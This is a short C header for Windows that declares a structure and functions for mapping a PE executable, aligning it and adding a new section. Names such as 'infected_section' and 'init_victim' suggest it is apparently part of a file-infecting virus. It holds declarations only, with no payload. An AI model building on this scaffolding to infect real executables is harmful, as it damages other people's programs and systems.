#pragma once
#include <Windows.h>

#define USUALLY_SECTION_ALIGN 0x1000
#define USUALLY_FILE_ALIGN 0x200

struct Exe_file
{
    HANDLE handle;
    LPBYTE mapped_handle;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS headers;
    PIMAGE_SECTION_HEADER infected_section;
    DWORD entry_address;
    DWORD origianal_file_size;
    DWORD file_size;
};

typedef struct Exe_file EXE_file;

DWORD set_exe_headers(EXE_file*);
void create_new_section(EXE_file*, DWORD);
DWORD align(DWORD, DWORD, DWORD);
DWORD add_file_empty_place(PCHAR, DWORD, DWORD*);
EXE_file* init_victim(char*, int, int*);
void delete_EXE_file(EXE_file*);
